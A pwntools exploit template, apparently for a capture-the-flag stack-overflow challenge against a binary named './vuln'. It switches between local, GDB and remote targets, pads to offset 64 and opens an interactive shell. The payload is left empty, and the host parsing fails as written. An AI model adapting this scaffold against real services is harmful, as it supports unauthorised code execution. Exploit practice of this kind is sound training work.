from pwn import *

CONN = "".split(" ")
HOST = CONN[1]
PORT = CONN[2]

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = """
c
""".format(
    **locals()
)

# Binary filename
exe = "./vuln"

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)

# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

# Pass in pattern_size, get back EIP/RIP offset
offset = 64

# Start program
io = start()

# Build the payload
payload = flat({offset: []})

# Send the payload
io.sendlineafter(b">", payload)
io.recvuntil(b"Thank you!")

# Got Shell?
io.interactive()